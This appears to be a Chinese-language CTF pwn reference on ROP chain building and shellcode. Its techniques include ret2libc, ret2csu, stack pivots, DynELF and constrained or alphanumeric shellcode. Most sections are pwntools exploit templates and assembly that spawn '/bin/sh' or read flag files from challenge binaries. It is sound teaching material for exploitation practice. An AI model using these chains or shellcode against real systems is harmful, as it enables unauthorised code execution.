# CTF Pwn - ROP 链与 Shellcode

## 目录
- [构造 ROP 链](#构造-rop-链)
  - [两段式 ret2libc（泄漏 + shell）](#两段式-ret2libc泄漏--shell)
  - [原生 syscall ROP（system() 失败时）](#原生-syscall-ropsystem-失败时)
  - [ROP 链中的 rdx 控制](#rop-链中的-rdx-控制)
  - [execve 之后的 shell 交互](#execve-之后的-shell-交互)
- [ret2csu — __libc_csu_init gadget（Crypto-Cat）](#ret2csu--__libc_csu_init-gadgetcrypto-cat)
- [ROP 中用 XOR 编码绕过坏字符（Crypto-Cat）](#rop-中用-xor-编码绕过坏字符crypto-cat)
- [冷门 x86 gadget — BEXTR/XLAT/STOSB/PEXT（Crypto-Cat）](#冷门-x86-gadget--bextrxlatstosbpextcrypto-cat)
  - [64 位：BEXTR + XLAT + STOSB](#64-位bextr--xlat--stosb)
  - [32 位：PEXT（并行位提取）](#32-位pext并行位提取)
- [通过 xchg rax,esp 做栈迁移（Crypto-Cat）](#通过-xchg-raxesp-做栈迁移crypto-cat)
- [用 sprintf() 串联绕过坏字符（PlaidCTF 2013）](#用-sprintf-串联绕过坏字符plaidctf-2013)
- [DynELF 自动探测 libc（RC3 CTF 2016）](#dynelf-自动探测-libcrc3-ctf-2016)
- [小缓冲区中的受限 shellcode（TUM CTF 2016）](#小缓冲区中的受限-shellcodetum-ctf-2016)
- [栈 canary XOR 收尾作为 RDX 清零 gadget（VolgaCTF 2017）](#栈-canary-xor-收尾作为-rdx-清零-gadgetvolgactf-2017)
- [利用已初始化寄存器写极简 shellcode（Square CTF 2017）](#利用已初始化寄存器写极简-shellcodesquare-ctf-2017)
- [利用 syscall 把 RIP 存入 RCX 的唯一字节 shellcode（HITCON 2017）](#利用-syscall-把-rip-存入-rcx-的唯一字节-shellcodehitcon-2017)
- [用 stub_execveat 系统调用替代 execve（ASIS CTF 2018）](#用-stub_execveat-系统调用替代-execveasis-ctf-2018)
- [rax=0 时用 push/pop 引导字母数字 shellcode（nullcon HackIM 2019）](#rax0-时用-pushpop-引导字母数字-shellcodenullcon-hackim-2019)

关于双重栈迁移、带 UTF-8 约束的 SROP、RETF 架构切换、seccomp 绕过、.fini_array 劫持、ret2vdso、pwntools 模板以及带输入反转的 shellcode，见 [rop-advanced.md](rop-advanced.md)。

---

<a id="rop-chain-building"></a>
## 构造 ROP 链

```python
from pwn import *

elf = ELF('./binary')
libc = ELF('./libc.so.6')
rop = ROP(elf)

# Common gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

# Leak libc
payload = flat(
    b'A' * offset,
    pop_rdi,
    elf.got['puts'],
    elf.plt['puts'],
    elf.symbols['main']
)
```

<a id="two-stage-ret2libc-leak--shell"></a>
### 两段式 ret2libc（泄漏 + shell）

分两阶段利用时，要谨慎选择第二阶段的返回目标：

```python
# Stage 1: Leak libc via puts@PLT, then re-enter vuln for stage 2
payload1 = b'A' * offset
payload1 += p64(pop_rdi)
payload1 += p64(elf.got['puts'])
payload1 += p64(elf.plt['puts'])
payload1 += p64(CALL_VULN_ADDR)   # Address of 'call vuln' instruction in main

# IMPORTANT: Return target after leak
# - Returning to main may crash if check_status/setup corrupts stack
# - Returning to vuln directly may have stack issues
# - Best: return to the 'call vuln' instruction in main (e.g., 0x401239)
#   This sets up a clean stack frame via the CALL instruction
```

**printf 无换行时的泄漏解析：**
```python
# If printf("Laundry complete") has no trailing newline,
# puts() leak appears right after it on the same line:
# Output: "Laundry complete\x50\x5e\x2c\x7e\x56\x7f\n"
p.recvuntil(b'Laundry complete')
leaked = p.recvline().strip()
libc_addr = u64(leaked.ljust(8, b'\x00'))
```

<a id="raw-syscall-rop-when-system-fails"></a>
### 原生 syscall ROP（system() 失败时）

如果通过 libc 函数入口调用 `system()` 或 `execve()` 会崩溃（CET/IBT、栈问题），改用 libc 中的原生 `syscall` 指令 gadget：

```python
# Find gadgets in libc
libc_rop = ROP(libc)
pop_rax = libc_rop.find_gadget(['pop rax', 'ret'])[0]
pop_rdi = libc_rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = libc_rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx_rbx = libc_rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0]  # common in modern glibc
syscall_ret = libc_rop.find_gadget(['syscall', 'ret'])[0]

# execve("/bin/sh", NULL, NULL) = syscall 59
payload = b'A' * offset
payload += p64(libc_base + pop_rax)
payload += p64(59)
payload += p64(libc_base + pop_rdi)
payload += p64(libc_base + next(libc.search(b'/bin/sh')))
payload += p64(libc_base + pop_rsi)
payload += p64(0)
payload += p64(libc_base + pop_rdx_rbx)
payload += p64(0)
payload += p64(0)  # rbx junk
payload += p64(libc_base + syscall_ret)
```

**何时用原生 syscall、何时用 libc 函数：**
- 通过 libc 调 `system()`：最简单，但可能因栈对齐或 CET 崩溃
- 通过 libc 调 `execve()`：避开 `system()` 的子进程开销，CET 风险相同
- 原生 `syscall`：绕过所有 libc 函数序言，在 ROP 中最可靠
- 注意：现代 libc 中 `pop rdx; ret` 很稀少，应寻找 `pop rdx; pop rbx; ret`

<a id="rdx-control-in-rop-chains"></a>
### ROP 链中的 rdx 控制

调用 libc 函数（尤其是 `puts`）之后，`rdx` 常被改写成很小的值（例如 1）。这会破坏 ROP 链后续的 `read(fd, buf, rdx)` 调用。

**解决方案：**
1. **从 libc 找 pop rdx gadget** —— `pop rdx; ret` 稀少；寻找 `pop rdx; pop rbx; ret`（glibc 2.35 中常见于约 0x904a9）
2. **重新进入程序的 read 初始化代码** —— 跳到设置 `rdx` 后再 `read` 的代码：
   ```python
   # vuln's read setup: lea rax,[rbp-0x40]; mov edx,0x100; mov rsi,rax; mov edi,0; call read
   # Set rbp first so rbp-0x40 points to target buffer:
   POP_RBP_RET = 0x40113d
   VULN_READ_SETUP = 0x4011ea  # lea rax, [rbp-0x40]

   payload += p64(POP_RBP_RET)
   payload += p64(TARGET_ADDR + 0x40)  # rbp-0x40 = TARGET_ADDR
   payload += p64(VULN_READ_SETUP)     # read(0, TARGET_ADDR, 0x100)
   # WARNING: After read, code continues to printf + leave;ret
   # leave sets rsp=rbp, so you get a stack pivot to rbp!
   ```
3. **通过 leave;ret 做栈迁移** —— 重新进入 vuln 的 read 代码时，read 之后的 `leave;ret` 会把栈迁移到 `rbp`。把下一条 ROP 链写在通过 read 发送的数据中 `rbp+8` 的位置。

<a id="shell-interaction-after-execve"></a>
### execve 之后的 shell 交互

通过 ROP 拿到 shell 后，shell 读取的是与程序相同的 stdin。过早发送的命令可能被之前的 `read()` 调用吞掉。

```python
p.send(payload)  # Trigger execve

# Wait for shell to initialize before sending commands
import time
time.sleep(1)
p.sendline(b'id')
time.sleep(0.5)
result = p.recv(timeout=3)

# For flag retrieval:
p.sendline(b'cat /flag* flag* 2>/dev/null')
time.sleep(0.5)
flag = p.recv(timeout=3)

# DON'T pipe commands via stdin when using pwntools - they get consumed
# by earlier read() calls. Use explicit sendline() after delays instead.
```

<a id="ret2csu--__libc_csu_init-gadgets-crypto-cat"></a>
## ret2csu — __libc_csu_init gadget（Crypto-Cat）

**何时使用：** 需要为某次函数调用控制 `rdx`、`rsi` 和 `edi`，但程序里没有直接的 `pop rdx` gadget。`__libc_csu_init` 几乎存在于所有动态链接的 ELF 中，且包含两段有用的 gadget 序列。

**Gadget 1（pop 链）：** 位于 `__libc_csu_init` 末尾：
```asm
pop rbx        ; 0
pop rbp        ; 1
pop r12        ; function pointer (address of GOT entry)
pop r13        ; edi value
pop r14        ; rsi value
pop r15        ; rdx value
ret
```

**Gadget 2（调用 + 设置寄存器）：** 位于 `__libc_csu_init` 靠前处：
```asm
mov rdx, r15   ; rdx = r15
mov rsi, r14   ; rsi = r14
mov edi, r13d  ; edi = r13 (32-bit!)
call [r12 + rbx*8]  ; call function pointer
add rbx, 1
cmp rbp, rbx
jne .loop      ; loop if rbx != rbp
; falls through to gadget 1 pop chain
```

**利用模式：**
```python
csu_pop = elf.symbols['__libc_csu_init'] + OFFSET_TO_POP_CHAIN
csu_call = elf.symbols['__libc_csu_init'] + OFFSET_TO_MOV_CALL

payload = flat(
    b'A' * offset,
    csu_pop,
    0,            # rbx = 0 (index)
    1,            # rbp = 1 (loop count, must equal rbx+1)
    elf.got['puts'],  # r12 = function to call (GOT entry)
    0xdeadbeef,   # r13 → edi (first arg, 32-bit only!)
    0xcafebabe,   # r14 → rsi (second arg)
    0x12345678,   # r15 → rdx (third arg)
    csu_call,     # trigger mov + call
    b'\x00' * 56, # padding for the 7 pops after call returns
    next_gadget,  # return address after csu completes
)
```

**限制：** `edi` 通过 `mov edi, r13d` 设置——只写低 32 位。需要 64 位第一参数时，改用 `pop rdi; ret` gadget。函数通过 `call [r12 + rbx*8]` 调用——即通过指针的间接调用，所以 `r12` 必须指向 GOT 项或其他存放目标地址的内存。

**关键点：** ret2csu 提供了通用 gadget，可设置最多 3 个参数（`rdi`、`rsi`、`rdx`）并通过 GOT 项调用任意函数，无需 libc gadget。适用于静态体积小但动态链接的程序。

---

<a id="bad-character-bypass-via-xor-encoding-in-rop-crypto-cat"></a>
## ROP 中用 XOR 编码绕过坏字符（Crypto-Cat）

**何时使用：** ROP 载荷需要把数据（例如 `"/bin/sh"` 或 `"flag.txt"`）写入内存，但某些字节被禁用（空字节、换行、空格等）。

**策略：** 用已知密钥对每块数据做 XOR，把 XOR 后的值写入 `.data` 段，然后用程序里的 gadget 在原位 XOR 回来。

**所需 gadget：**
```asm
pop r14; pop r15; ret          ; load XOR key (r14) and target address (r15)
xor [r15], r14; ret            ; XOR memory at r15 with r14
mov [r15], r14; ret            ; write r14 to memory at r15 (initial write)
```

**利用模式：**
```python
data_section = elf.symbols['__data_start']  # or .data address
xor_key = 2  # simple key that removes bad chars

def xor_bytes(data, key):
    return bytes(b ^ key for b in data)

target = b"flag.txt"
encoded = xor_bytes(target, xor_key)

payload = b'A' * offset

# Write XOR'd data in 8-byte chunks
for i in range(0, len(encoded), 8):
    chunk = encoded[i:i+8].ljust(8, b'\x00')
    payload += flat(
        pop_r14_r15,
        chunk,                    # XOR'd data
        data_section + i,         # destination address
        mov_r15_r14,              # write to memory
    )

# XOR each chunk back to recover original
for i in range(0, len(target), 8):
    payload += flat(
        pop_r14_r15,
        p64(xor_key),             # XOR key
        data_section + i,         # target address
        xor_r15_r14,              # decode in place
    )

# Now data_section contains "flag.txt" — use it as argument
payload += flat(pop_rdi, data_section, elf.plt['print_file'])
```

**关键点：** XOR 是自逆运算（`a ^ k ^ k = a`）。选一个能把所有禁用字节转换成允许字节的密钥。简单情况下，XOR `2` 或 `0x41` 即可。限制复杂时按字节求解：对每个位置，找到使 `original ^ key` 避开所有坏字符的密钥字节。

---

<a id="exotic-x86-gadgets--bextrxlatstosbpext-crypto-cat"></a>
## 冷门 x86 gadget — BEXTR/XLAT/STOSB/PEXT（Crypto-Cat）

**何时使用：** 程序里没有标准的 `mov [reg], reg` 写 gadget。寻找可以串联起来做逐字节内存写的冷门 x86 指令。

<a id="64-bit-bextr--xlat--stosb"></a>
### 64 位：BEXTR + XLAT + STOSB

**BEXTR**（位字段提取）从源寄存器中提取位。**XLAT** 通过表查找翻译一个字节（`al = [rbx + al]`）。**STOSB** 把 `al` 存入 `[rdi]` 并自增 `rdi`。

```python
# Gadgets from questionableGadgets section of binary
xlat_ret = elf.symbols.questionableGadgets          # xlat byte ptr [rbx]; ret
bextr_ret = elf.symbols.questionableGadgets + 2     # pop rdx; pop rcx; add rcx, 0x3ef2;
                                                     # bextr rbx, rcx, rdx; ret
stosb_ret = elf.symbols.questionableGadgets + 17    # stosb byte ptr [rdi], al; ret

data_section = elf.symbols.__data_start

# Write "flag.txt" byte by byte
for i, char in enumerate(b"flag.txt"):
    # Find address of char in binary's read-only data
    char_addr = next(elf.search(bytes([char])))

    # BEXTR extracts rbx from rcx using rdx as control
    # rcx = char_addr - 0x3ef2 (compensate for add)
    # rdx = 0x4000 (extract 64 bits starting at bit 0)
    payload += flat(
        bextr_ret,
        0x4000,                    # rdx (BEXTR control: start=0, len=64)
        char_addr - 0x3ef2,        # rcx (offset compensated)
        xlat_ret,                  # al = byte at [rbx + al]
        pop_rdi,
        data_section + i,
        stosb_ret,                 # [rdi] = al; rdi++
    )
```

<a id="32-bit-pext-parallel-bits-extract"></a>
### 32 位：PEXT（并行位提取）

**PEXT** 用掩码从源中选位并紧凑打包。结合 BSWAP 和 XCHG 可做字节级写入。

```python
# Gadgets
pext_ret = elf.symbols.questionableGadgets           # mov eax,ebp; mov ebx,0xb0bababa;
                                                      # pext edx,ebx,eax; ...ret
bswap_ret = elf.symbols.questionableGadgets + 21     # pop ecx; bswap ecx; ret
xchg_ret = elf.symbols.questionableGadgets + 18      # xchg byte ptr [ecx], dl; ret

# For each target byte, compute mask so that PEXT(0xb0bababa, mask) = target_byte
def find_mask(target_byte, source=0xb0bababa):
    """Find 32-bit mask that extracts target_byte from source via PEXT."""
    source_bits = [(source >> i) & 1 for i in range(32)]
    target_bits = [(target_byte >> i) & 1 for i in range(8)]
    # Select 8 bits from source that match target bits
    mask = 0
    matched = 0
    for i in range(32):
        if matched < 8 and source_bits[i] == target_bits[matched]:
            mask |= (1 << i)
            matched += 1
    return mask if matched == 8 else None
```

**关键点：** 当程序缺少标准写 gadget 时，冷门指令（BEXTR、PEXT、XLAT、STOSB、BSWAP、XCHG）可以串联达到同样效果。检查题目二进制中 `questionableGadgets` 之类的命名段。

---

<a id="stack-pivot-via-xchg-raxesp-crypto-cat"></a>
## 通过 xchg rax,esp 做栈迁移（Crypto-Cat）

**何时使用：** 缓冲区太小放不下完整 ROP 链，但程序泄漏了已准备好较大缓冲区的堆/栈地址。

**两段式模式：**
```python
# Stage 1: Program provides a heap address where it wrote user data
pivot_addr = int(io.recvline(), 16)

# Prepare ROP chain at the pivot address (via earlier input)
stage2_rop = flat(
    pop_rdi, elf.got['puts'],
    elf.plt['puts'],             # leak libc
    elf.symbols['main'],         # return to main for stage 3
)
io.send(stage2_rop)             # Written to pivot_addr by program

# Stage 2: Overflow with stack pivot
xchg_rax_esp = elf.symbols.usefulGadgets + 2  # xchg rax, esp; ret
pop_rax = elf.symbols.usefulGadgets            # pop rax; ret

payload = flat(
    b'A' * offset,
    pop_rax,
    pivot_addr,         # load pivot address into rax
    xchg_rax_esp,       # swap rax ↔ esp → stack now points to stage2_rop
)
```

**为什么用 xchg 而不是 leave;ret：**
- `leave; ret` 设置 `rsp = rbp`——需要控制 `rbp`（通常可通过溢出做到）
- `xchg rax, esp` 直接交换——需要控制 `rax`（通过 `pop rax; ret`）
- 即使 `rbp` 不在栈上（例如小缓冲区溢出），`xchg` 也能用

**限制：** 在 x86-64 上 `xchg rax, esp` 会截断为 32 位（把 rsp 高 32 位清零）。迁移地址必须位于地址空间低 4GB。堆和 mmap 区域通常满足；栈地址（0x7fff...）不满足。

---

<a id="sprintf-gadget-chaining-for-bad-character-bypass-plaidctf-2013"></a>
## 用 sprintf() 串联绕过坏字符（PlaidCTF 2013）

**模式：** 当 shellcode 含有被输入处理逻辑过滤的字节（空字节、空格、斜杠、冒号等）时，用 `sprintf()` 从可执行文件自身的内存中逐字节拷贝——每次一个字节——在 BSS 上拼装出干净的 shellcode。

```python
from pwn import *

# Step 1: Scan executable for addresses containing each needed byte
exe_data = open('binary', 'rb').read()
byte_addrs = {}  # Maps byte value -> address in executable
for c in range(256):
    for i in range(len(exe_data)):
        addr = exe_base + i
        if exe_data[i] == c and not has_bad_chars(p32(addr)):
            byte_addrs[c] = addr
            break

# Step 2: Chain sprintf(bss_dest, byte_addr) for each shellcode byte
rop = b''
for i, byte in enumerate(shellcode):
    rop += p32(sprintf_plt)
    rop += p32(pop3ret)           # Clean 3 args
    rop += p32(bss_addr + i)     # Destination
    rop += p32(byte_addrs[byte]) # Source (1 byte + null terminator)
    rop += p32(0)                # Unused arg

# Step 3: Jump to assembled shellcode on BSS
rop += p32(bss_addr)
```

**关键点：** `sprintf(dst, src)` 会一直拷贝到空字节终止符——当 `src` 指向“一个字节 + `\x00`”时，等效于单字节拷贝。ROP 链中每次调用放置一个 shellcode 字节。源地址来自二进制自身的 `.text`/`.rodata` 段。需要在调用之间用 `pop3ret` gadget 清理栈。

---

<a id="dynelf-automated-libc-discovery-rc3-ctf-2016"></a>
## DynELF 自动探测 libc（RC3 CTF 2016）

当远端 libc 版本未知时，用 pwntools 的 `DynELF` 通过格式化字符串或读原语泄漏内存，在运行时解析函数地址。

```python
from pwn import *

elf = ELF('./target')
io = remote('target.ctf', 1337)

# Define a leak function that reads memory at a given address
def leak(addr):
    payload = b'A' * offset
    payload += p64(elf.plt['printf'])  # call printf to leak
    payload += p64(main_addr)          # return to main for next leak
    payload += p64(addr)               # argument: address to read
    io.sendline(payload)
    data = io.recvuntil(b'prompt', drop=True)
    return data

# DynELF resolves symbols by parsing ELF structures in memory
d = DynELF(leak, elf=elf)
system_addr = d.lookup('system', 'libc')
binsh_addr = d.lookup(None, 'libc')  # search for "/bin/sh" string

log.success(f"system @ {hex(system_addr)}")

# Build final ROP chain with resolved addresses
payload = b'A' * offset
payload += p64(pop_rdi_ret)
payload += p64(binsh_addr)
payload += p64(system_addr)
io.sendline(payload)
io.interactive()
```

**关键点：** DynELF 解析远端 ELF 的 `.dynamic` 段、link map 和符号表，无需知道 libc 版本即可解析任意 libc 函数。需要可靠的内存读原语（leak 函数）来读取任意地址。

---

<a id="constrained-shellcode-in-small-buffers-tum-ctf-2016"></a>
## 小缓冲区中的受限 shellcode（TUM CTF 2016）

当 shellcode 空间非常受限（例如因 AES 块大小只有 15-16 字节）时，使用最少的寄存器设置并避免多余指令。

```asm
; 15-byte execve("/bin/sh") shellcode for x86-64
; Assumes: rsp points to writable area, "/bin/sh\0" follows shellcode on stack
; Written in fasm syntax:

lea rdi, [rsp + 0x19]    ; 4 bytes - pointer to "/bin/sh" on stack
cdq                       ; 1 byte  - rdx = 0 (envp = NULL)
push rdx                  ; 1 byte  - NULL terminator for argv
push rdi                  ; 1 byte  - argv[0] = "/bin/sh"
push rsp                  ; 1 byte
pop rsi                   ; 1 byte  - rsi = argv = {"/bin/sh", NULL}
push 0x3b                 ; 2 bytes - syscall number for execve
pop rax                   ; 1 byte  - rax = 59
syscall                   ; 2 bytes - execve("/bin/sh", argv, NULL)
; Total: 15 bytes

; When AES-CBC is involved, craft IV to XOR-decrypt shellcode block:
; crafted_iv = AES_decrypt(known_ciphertext) XOR shellcode
```

**关键点：** `cdq` 指令（1 字节）把 eax 符号扩展到 edx，`push reg; pop reg` 组合（2 字节）可替代 `mov`（3 字节）。在受 AES 块限制的 shellcode 场景中，把 `AES_decrypt(ciphertext_block)` 与期望的 shellcode 做 XOR，即可算出能解密出 shellcode 的 IV。

---

<a id="stack-canary-xor-epilogue-as-rdx-zeroing-gadget-volgactf-2017"></a>
## 栈 canary XOR 收尾作为 RDX 清零 gadget（VolgaCTF 2017）

**何时使用：** 需要 `rdx = 0` 用于 `execve(path, argv, NULL)`，但程序里没有 `pop rdx; ret` gadget。canary 校验收尾代码 `xor rdx, fs:28h` 会在 canary 完好时把 RDX 清零。

```python
from pwn import *

# Canary check epilogue (found in most binaries):
# mov rdx, [rsp+8]    ; load canary from stack
# xor rdx, fs:28h     ; XOR with stored canary → 0 if intact
# Jump into this code as a "gadget" to zero RDX

# Find the canary check sequence in the binary
canary_xor_gadget = next(binary.search(asm(
    "mov rdx, [rsp+8]; xor rdx, qword ptr fs:[0x28]"
)))
# Side effect: harmless write of je result, rdx = 0 for execve(path, argv, NULL)

# Use in ROP chain:
rop = flat(
    pop_rdi, binsh_addr,          # rdi = "/bin/sh"
    pop_rsi, 0,                   # rsi = NULL (argv)
    canary_xor_gadget,            # rdx = canary ^ fs:28h = 0
    execve_addr,                  # execve("/bin/sh", NULL, NULL)
)
```

**关键点：** 栈 canary 校验中的 `xor rdx, fs:28h` 在 canary 正确时产生 `rdx=0`。当没有 `pop rdx` 时，把这段收尾代码当成 gadget 跳进去——它提供了可靠的 rdx 清零原语，唯一副作用是无害的字节写。之所以可行，是因为栈上的 canary 与 `fs:28h` 一致，未被破坏的栈帧中 XOR 结果恒为零。

**何时识别：** ROP 链需要 `rdx=0`（`execve` 第三参数常见需求），但程序缺少 `pop rdx; ret` 或 `pop rdx; pop rbx; ret`。在反汇编中搜索 `xor rdx, qword ptr fs:`——每个带栈 canary 的函数里都有。

**参考：** VolgaCTF 2017

---

<a id="minimal-shellcode-with-pre-initialized-registers-square-ctf-2017"></a>
## 利用已初始化寄存器写极简 shellcode（Square CTF 2017）

**模式：** 当 shellcode 入口处寄存器已经是有用的值（例如 x86-32 上 `eax=4` 对应 `write` 系统调用、`ebx=1` 对应 stdout），利用它们能大幅缩短 shellcode。从头写 shellcode 前，先审计入口处的寄存器状态。

**示例（x86-32 write 系统调用，入口：eax=4、ebx=1）：**
```asm
; Entry state: eax=4 (sys_write), ebx=1 (stdout fd)
; Goal: write flag buffer to stdout — only need ecx and edx

; 3-byte: point ecx at the flag buffer
lea ecx, [edi + flag_offset]   ; 3 bytes (if offset fits in 1 byte)

; 2-byte: set edx (byte count)
mov dl, 64                      ; 2 bytes

; 2-byte: trigger syscall
int 0x80                        ; 2 bytes

; Total: 7 bytes — or as few as 5 if edx is already set
```

**工作流程：**
```python
# 1. Run the binary in gdb, break right before shellcode is executed
# 2. Inspect all registers: info registers
# 3. Identify which syscall arguments are already set
# 4. Write only the instructions needed to fill missing arguments

# Useful pre-initialized patterns:
# - eax = syscall number already set by caller
# - ebx = fd (stdin=0, stdout=1) from prior open/setup
# - rdi, rsi from calling convention leakage
# - rsp pointing into a writable region (for push-based addressing)
```

**关键点：** 写 shellcode 前务必审计入口寄存器值——预置的系统调用号和 fd 值可以把 shellcode 缩到 6 字节以内。最小的 shellcode 利用的是周围代码遗留的 ABI 调用约定残值。

**参考：** Square CTF 2017

---

<a id="unique-byte-shellcode-via-syscall-rip-to-rcx-hitcon-2017"></a>
## 利用 syscall 把 RIP 存入 RCX 的唯一字节 shellcode（HITCON 2017）

**模式：** x86-64 的 `syscall` 指令会把 `RIP`（下一条指令地址）存入 `RCX`。一个 8 字节 stager 利用这一点：先执行 `syscall`（同时以预置寄存器触发一次 `read`），再把 `rcx`（此时等于 `syscall` 后一条指令的地址）作为地址，把完整 shellcode 读到同一块 RWX 区域。stager 的 8 个字节必须互不相同（无重复字节）。

**8 字节 stager 构造：**
```asm
; Entry constraints: rax=0 (read), rdi=0 (stdin), rsi=shellcode_buf, rdx=8 (small)
; Side effect of syscall: rcx = RIP (address of next instruction after syscall)

syscall          ; 2 bytes: 0f 05 — executes read(0, shellcode_buf, 8)
                 ;           and sets rcx = &next_instr (= shellcode_buf + 2)
push rcx         ; 1 byte:  51 — stack = [shellcode_buf + 2]
pop rsi          ; 1 byte:  5e — rsi = shellcode_buf + 2 (where full shellcode goes)
xor edx, edx     ; 2 bytes: 31 d2 — clear rdx
mov dl, 100      ; 2 bytes: b2 64 — rdx = 100 (read size for stage 2)
; Back to syscall (loop): the push/pop sequence ends up jumping to syscall again
; ... or arrange entry so the next syscall reads 100 bytes to rsi
```

**唯一性约束：**
```python
# All 8 bytes must be distinct (challenge-specific filter)
# Candidate sequence: 0f 05 51 5e 31 d2 b2 64  — all unique
# Verify: len(set(bytes)) == len(bytes)
stager = bytes([0x0f, 0x05, 0x51, 0x5e, 0x31, 0xd2, 0xb2, 0x64])
assert len(set(stager)) == len(stager)  # passes

# Stage 2: full execve shellcode sent to stdin after stager runs first syscall
from pwn import *
p.send(stager)
p.send(asm(shellcraft.sh()))
```

**关键点：** x86-64 的 `syscall` 会把 RIP 拷入 RCX——可将其武器化为极短 stager 的位置无关地址发现手段。stager 无需硬编码地址：它通过 `syscall` 副作用算出自身位置，再把该地址用作读取完整载荷的目标。

**参考：** HITCON CTF 2017

---

<a id="stub_execveat-syscall-as-execve-alternative-asis-ctf-2018"></a>
## 用 stub_execveat 系统调用替代 execve（ASIS CTF 2018）

**模式：** 在只有 `read` 系统调用、没有 `pop rax` gadget 的极小程序中，用 `stub_execveat`（系统调用号 0x142/322）代替 `execve`（0x3b）。因为 `read()` 会把读取字节数返回到 `rax`，让总输入长度恰好为 0x142 字节，这样 syscall gadget 触发时 `rax=0x142`。

**为什么可行：**
1. 程序极小——只有 `read` 和基础 gadget，没有 `pop rax; ret`
2. `execve` 需要 `rax=0x3b`（59），但没有 `pop rax` 就无法设置
3. `read()` 把读取字节数返回到 `rax`——这是唯一能控制 rax 的途径
4. `stub_execveat`（系统调用 322 = 0x142）在目录 fd 使用 `AT_FDCWD` 时接受与 `execve` 相同的参数
5. 精确发送 0x142 字节，使 `read()` 返回 0x142，然后命中 `syscall`

```python
from pwn import *

# Binary gadgets (tiny static binary)
xor_rdx_syscall = 0x4000ed   # xor rdx, rdx; syscall
syscall_gadget  = 0x400101   # syscall

# Build payload: /bin/sh string + padding + ROP chain
# Total length must be exactly 0x142 bytes
payload  = b"/bin/sh\x00"                          # rdi points here
payload += b"B" * (0x148 - (8*4) - 8)              # padding to ROP area
payload += p64(xor_rdx_syscall)                     # xor rdx, rdx; syscall
payload += p64(syscall_gadget)                      # syscall (rax=0x142 from read)
payload += b"A" * (0x142 - len(payload) - 1)        # pad to exactly 0x142 bytes
# rax = 0x142 from read() return value = stub_execveat syscall number

io = remote('target', 1337)
io.send(payload)
io.interactive()
```

**关键点：** 使用 `AT_FDCWD` 时，`stub_execveat`（系统调用 322/0x142）接受与 execve 相同的参数；但在没有 `pop rax; ret` gadget 时，它更高的系统调用号可通过 `read()` 返回值到达。始终检查功能等价的替代系统调用，其编号是否能通过返回值或其他隐式寄存器控制到达。

**参考：** ASIS CTF 2018

---

<a id="alphanumeric-shellcode-bootstrap-via-pushpop-when-rax0-nullcon-hackim-2019"></a>
## rax=0 时用 push/pop 引导字母数字 shellcode（nullcon HackIM 2019）

**模式（easy-shell）：** RWX 页接收攻击者的 shellcode，但每个字节都必须是字母数字（`[0-9A-Za-z]`）。像 [basic-amd64-alphanumeric-shellcode-encoder](https://github.com/veritas501/basic-amd64-alphanumeric-shellcode-encoder) 这样的工具会生成自解码 stub，但要求入口时 `rax + padding_len == shellcode_address`。当运行框架进入时 `rax = 0`（离 shellcode 很远），编码器就没有可落点。在前面加一个 3 字节的非字母数字但可接受的种子——`push r12; pop rax`——让 `rax` 变成一个有效的栈/代码指针，然后用 `padding_len=3` 调用编码器。

```python
from pwn import *
context(arch='amd64')

file_name = "flag".ljust(8, '\x00')
sc = '''
    mov rax, %s
    push rax
    mov rdi, rsp
    mov rax, 2          /* open(rsp, 0) */
    mov rsi, 0
    syscall
    mov rdi, rax
    sub rsp, 0x20
    mov rsi, rsp
    mov rdx, 0x20
    mov rax, 0          /* read(fd, rsp, 0x20) */
    syscall
    mov rdi, 0
    mov rsi, rsp
    mov rdx, 0x20
    mov rax, 1          /* write(1, rsp, 0x20) */
    syscall
''' % hex(u64(file_name))
sc = asm(sc)

# push r12 (0x41 0x54) + pop rax (0x58) = 3 bytes, all happen to be alnum-safe
bootstrap = asm("push r12; pop rax;")
payload = bootstrap + alphanum_encoder(sc, 3)
```

**关键点：** 纯字母数字解码器通常需要 `rax` 指向载荷（或载荷前固定偏移）。如果运行框架把 `rax` 清零，就从*任意*已持有有效地址的易失寄存器给它播种——在 Linux 上 `r12` 通常是 `_start`，而 `push r12; pop rax` 恰好是 `AT X`（0x41 0x54 0x58），编码器的输入过滤器会视为无害。把编码器的 `padding_len` 参数调整到与前置字节数完全一致，解码计算才能对齐。

**参考：** nullcon HackIM 2019 — easy-shell，writeups 13048、13203
